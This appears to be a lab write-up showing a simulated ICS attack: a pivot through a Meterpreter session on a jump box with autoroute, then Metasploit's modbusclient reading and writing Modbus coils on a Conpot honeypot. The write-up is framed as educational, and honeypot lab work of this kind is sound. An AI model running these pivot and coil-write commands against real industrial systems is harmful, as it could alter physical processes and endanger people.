# 🛠 ICS Honeypot Attack Lab: Modbus Exploitation via Conpot

This lab simulates a real-world ICS attack scenario by pivoting through a compromised Windows jump box and exploiting an industrial honeypot (Conpot) using Modbus protocol commands. The target runs on a segregated ICS subnet.

---

## 🧱 Lab Setup

### 🔐 Network Structure

```
Kali (Attacker)
   ↳ Meterpreter Session on Windows Jump Box (192.168.1.150)
       ↳ Pivot Route to ICS Subnet (10.0.0.0/24)
           ↳ Conpot Modbus Honeypot (10.0.0.200:5020)
```

### 🧪 Tools Used

| Tool              | Purpose                       |
|------------------|-------------------------------|
| Kali Linux        | Attacker box                 |
| Metasploit        | Payloads, sessions, routing |
| Conpot            | ICS Honeypot (Modbus)        |
| Python + XML      | Template analysis            |

---

## 🔍 Reconnaissance

### 🎯 Target Identified via `ps aux`
Conpot is confirmed running on the honeypot with the Modbus template:

```bash
ps aux | grep conpot
```

### 🔍 Modbus Template Location

```bash
find ~/conpot-env -name modbus.xml
```

Located at:
```
/home/username/conpot-env/lib/python3.8/site-packages/conpot/templates/default/modbus/modbus.xml
```

---

## 🔁 Pivot: Route Through Meterpreter

```bash
meterpreter > run autoroute -s 10.0.0.0/24
```

> ✅ Adds a route from the jump box to the ICS subnet via `192.168.1.150`

---

## 🧨 Exploitation with `modbusclient`

### 1. **Read Coil Values**

```bash
use auxiliary/scanner/scada/modbusclient
set RHOSTS 10.0.0.200
set RPORT 5020
set ACTION READ_COILS
run
```

> ✔ Successfully read coil address 1

---

### 2. **Write to a Coil**

```bash
set ACTION WRITE_COIL
set DATA_ADDRESS 1
set DATA 0
run
```

> ✅ Output:
```
10.0.0.200:5020 - Value 0 successfully written at coil address 1
```

---

## 📜 Sample Output

![Successful write coil](path/to/your/screenshot.png)

---

## 📖 Analysis of `modbus.xml`

Extracted coil and register addresses from the honeypot XML:

```xml
<type>COILS</type>
<starting_address>1</starting_address>
<size>128</size>
```

---

## 📌 Summary

| Phase              | Result                   |
|-------------------|--------------------------|
| Initial Access     | Meterpreter session on Jump Box |
| Pivot              | `autoroute` to ICS subnet |
| Conpot Verification| Process running with Modbus |
| Read/Write Coils   | Successful via `modbusclient` |

---

## 🔐 Ethical Notice

This lab is purely for educational and research purposes in a closed, controlled environment. No real systems were accessed.

---

## 🚀 Next Steps

- Simulate unauthorized sensor manipulation
- Add logging and alerting via Conpot
- Expand to protocols like S7, BACnet, or DNP3
